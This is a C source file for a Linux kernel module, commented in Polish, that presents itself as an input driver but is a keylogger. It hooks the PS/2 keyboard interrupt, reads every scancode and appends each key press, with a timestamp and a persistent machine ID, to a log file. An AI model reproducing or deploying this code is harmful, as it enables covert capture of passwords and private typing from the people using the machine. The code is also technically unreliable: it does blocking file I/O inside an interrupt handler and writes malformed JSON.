#include <linux/module.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <linux/io.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/netdevice.h>
#include <linux/uuid.h>
#include <linux/fs.h>
#include <linux/kernel.h>

#include "codeTable.h" // Plik nagłówkowy z funkcją mapującą scancode na znak
#include "uniqueIdGenerator.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("Button Input Driver with Key Logging");

#define BUTTON_PORT 0x60 // Port klawiatury PS/2
#define BUTTON_IRQ 1     // IRQ klawiatury PS/2
#define LOG_FILE_PATH "/var/log/keylog.txt"

static struct input_dev *button_dev; // Urządzenie wejściowe
const char *uniqueId;
// Funkcja zapisująca dane do pliku logu
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/netdevice.h>
#include <linux/inetdevice.h>
#include <linux/ipv6.h>
#include <asm/processor.h>

static void getCurrentTime(char *buffer, size_t buffer_size)
{
    struct timespec64 ts;
    ktime_get_real_ts64(&ts);
    snprintf(buffer, buffer_size, "%lld.%09ld", (long long)ts.tv_sec, ts.tv_nsec);
}

// Funkcja zapisująca dane do pliku logu
static void write_to_log_file(const char *data)
{
    loff_t pos = 0;
    struct file *log_file;

    // Otwórz plik do zapisu (lub utwórz, jeśli nie istnieje)
    log_file = filp_open(LOG_FILE_PATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (IS_ERR(log_file))
    {
        pr_err("Failed to open log file\n");
        return;
    }

    char time_buffer[32];
    getCurrentTime(time_buffer, sizeof(time_buffer));
    // Przygotuj dane w formacie JSON
    char jsonData[120];
    snprintf(jsonData, sizeof(jsonData), "{ \"Time\": \"%s\" \"ID\": \"%s\", \"Key\": \"%s\"}\n", time_buffer, uniqueId, data);

    // Zapisz dane do pliku
    kernel_write(log_file, jsonData, strlen(jsonData), &pos);

    filp_close(log_file, NULL);
}

// Funkcja obsługi przerwania
static irqreturn_t button_interrupt(int irq, void *dummy)
{
    int scancode;
    char log_entry[32];

    scancode = inb(BUTTON_PORT); // Odczytaj scancode z portu

    const char *convChar = scancode_to_char(scancode); // Mapowanie scancode na znak

    // Sprawdź, czy to naciśnięcie klawisza, czy zwolnienie
    if (scancode & 0x80)
    {
        // Zwolnienie klawisza
        input_report_key(button_dev, scancode & 0x7F, 0); // 0 oznacza zwolnienie klawisza
    }
    else
    {
        // Naciśnięcie klawisza
        snprintf(log_entry, sizeof(log_entry), "%s", convChar); // Zamapowany znak
        input_report_key(button_dev, scancode, 1);              // 1 oznacza naciśnięcie klawisza
        write_to_log_file(log_entry);                           // Zapisz do pliku logu
    }

    input_sync(button_dev); // Synchronizacja zdarzenia
    return IRQ_HANDLED;     // Zgłoś obsługę przerwania
}

// Funkcja inicjalizująca moduł
static int __init button_init(void)
{

    uniqueId = getOrCreateUniqueId(); // Generowanie unikalnego identyfikatora
    int error;

    // Zarejestruj przerwanie
    if (request_irq(BUTTON_IRQ, button_interrupt, IRQF_SHARED, "button", (void *)button_interrupt))
    {
        pr_err("Failed to allocate IRQ %d\n", BUTTON_IRQ);
        return -EBUSY;
    }

    // Alokuj urządzenie wejściowe
    button_dev = input_allocate_device();
    if (!button_dev)
    {
        pr_err("Not enough memory to allocate input device\n");
        error = -ENOMEM;
        goto err_free_irq;
    }

    // Skonfiguruj urządzenie wejściowe
    button_dev->name = "Button Device with Key Logging";
    button_dev->evbit[0] = BIT_MASK(EV_KEY); // Zarejestruj typ zdarzenia EV_KEY (klawisze)

    // Zarejestruj urządzenie wejściowe
    error = input_register_device(button_dev);
    if (error)
    {
        pr_err("Failed to register input device\n");
        goto err_free_dev;
    }

    pr_info("Button input driver with key logging loaded\n");
    return 0;

err_free_dev:
    input_free_device(button_dev);
err_free_irq:
    free_irq(BUTTON_IRQ, (void *)button_interrupt);
    return error;
}

// Funkcja wyjścia z modułu
static void __exit button_exit(void)
{
    input_unregister_device(button_dev);            // Wyrejestruj urządzenie wejściowe
    free_irq(BUTTON_IRQ, (void *)button_interrupt); // Zwolnij przerwanie
    pr_info("Button input driver with key logging unloaded\n");
}

module_init(button_init);
module_exit(button_exit);
